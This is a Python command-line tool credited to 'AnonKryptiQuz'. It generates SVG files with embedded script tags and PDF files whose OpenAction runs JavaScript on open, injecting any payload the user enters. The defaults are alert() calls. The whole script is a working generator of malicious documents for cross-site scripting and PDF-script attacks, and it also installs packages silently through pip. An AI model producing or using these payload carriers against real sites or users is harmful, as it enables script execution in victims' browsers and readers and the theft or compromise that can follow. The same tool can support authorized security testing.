import os
import sys
import time
import subprocess
import importlib.util
import signal
from colorama import Fore, Style, init
from prompt_toolkit import prompt
from prompt_toolkit.formatted_text import HTML

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def is_package_installed(package):
    return importlib.util.find_spec(package) is not None

def install_package(package):
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
        print(f"{Fore.GREEN}[+] {package} installed successfully.")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] Failed to install {package}.")

def check_and_install_packages(packages):
    for package in packages:
        if is_package_installed(package):
            print(f"{Fore.GREEN}[+] {package} is already installed.")
        else:
            print(f"{Fore.YELLOW}[!] {package} is missing. Installing...")
            install_package(package)

def load_config():
    return ["colorama", "prompt_toolkit"]

def handle_interrupt(signal, frame):
    print(f"\n{Fore.RED}[!] Program interrupted. Exiting...")
    sys.exit(0)

def create_ScriptoSVG_file(filename, payload):
    svg_content = f'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="200" height="100">
  <script type="text/javascript">
    {payload}
  </script>
  <text x="6" y="50" font-family="Arial" font-size="16" fill="black">Created by: AnonKryptiQuz</text>
</svg>
'''
    try:
        with open(filename, "w") as file:
            file.write(svg_content)
        print(f"{Fore.GREEN}[+] Created the SVG file: {filename}")
    except IOError as e:
        print(f"{Fore.RED}[!] Error creating SVG file: {e}")

def create_ScriptoPDF_pdf(filename, payload):
    pdf_content = f'''%PDF-1.7
%âãÏÓ
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R/Metadata 4 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[5 0 R]/Count 1>>
endobj
3 0 obj
<</JS({payload}\n)/S/JavaScript/Type/Action>>
endobj
4 0 obj
<</Type/Metadata/Subtype/XML/Length 0>>
stream
endstream
endobj
5 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 6 0 R/Resources<</ProcSet[/PDF /Text]>> >>
endobj
6 0 obj
<</Length 44>>
stream
/Courier 12 Tf
100 700 Td
(Created by AnonKryptiQuz) Tj
ET
endstream
endobj
xref
0 7
0000000000 65535 f
0000000015 00000 n
0000000074 00000 n
0000000128 00000 n
0000000185 00000 n
0000000231 00000 n
0000000318 00000 n
trailer
<</Size 7/Root 1 0 R>>
startxref
382
%%EOF
'''
    try:
        with open(filename, "wb") as file:
            file.write(pdf_content.encode('latin1'))
        print(f"{Fore.GREEN}[+] Created the PDF file: {filename}")
    except IOError as e:
        print(f"{Fore.RED}[!] Error creating PDF file: {e}")

def show_menu():
    clear_screen()
    print(f"{Fore.GREEN}Welcome to Scripto Tool Suite - AnonKryptiQuz\n")
    print(f"{Fore.YELLOW}[1] ScriptoSVG: Create SVG with embedded JavaScript")
    print(f"{Fore.YELLOW}[2] ScriptoPDF: Create PDF with embedded JavaScript")
    print(f"{Fore.YELLOW}[0] Exit")

def main():
    signal.signal(signal.SIGINT, handle_interrupt)
    
    clear_screen()
    print(f"{Fore.YELLOW}[i] Checking for required packages...\n")
    
    required_packages = load_config()
    check_and_install_packages(required_packages)

    time.sleep(3)
    
    while True:
        clear_screen()
        print(f"{Fore.GREEN}Welcome to Scripto Tool Suite - AnonKryptiQuz\n")
        show_menu()
        option = prompt(HTML("<ansicyan>\n[?]</ansicyan> Choose an option: "))

        if option == "1":
            filename = prompt(HTML(f"<ansicyan>[?]</ansicyan> Enter the name for the SVG file (press Enter for default: <ansicyan>ScriptoSVG.svg</ansicyan>): ")) or "ScriptoSVG.svg"
            payload = prompt(HTML(f"<ansicyan>[?]</ansicyan> Enter the payload to embed in the SVG (press Enter for default: <ansicyan>alert('AnonKryptiQuz');</ansicyan>): ")) or "alert('AnonKryptiQuz');"
            create_ScriptoSVG_file(filename, payload)
            break

        elif option == "2":
            filename = prompt(HTML(f"<ansicyan>[?]</ansicyan> Enter the name for the PDF file (press Enter for default: <ansicyan>ScriptoPDF.pdf</ansicyan>): ")) or "ScriptoPDF.pdf"
            payload = prompt(HTML(f"<ansicyan>[?]</ansicyan> Enter the payload to embed in the PDF (press Enter for default: <ansicyan>app.alert('AnonKryptiQuz');</ansicyan>): ")) or "app.alert('AnonKryptiQuz');"
            create_ScriptoPDF_pdf(filename, payload)
            break

        elif option == "0":
            print(f"{Fore.GREEN}[+] Exiting the program. Goodbye!")
            break

        else:
            print(f"{Fore.RED}[!] Wrong option selected. Press Enter to try again.")
            prompt()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Operation interrupted. Exiting...")
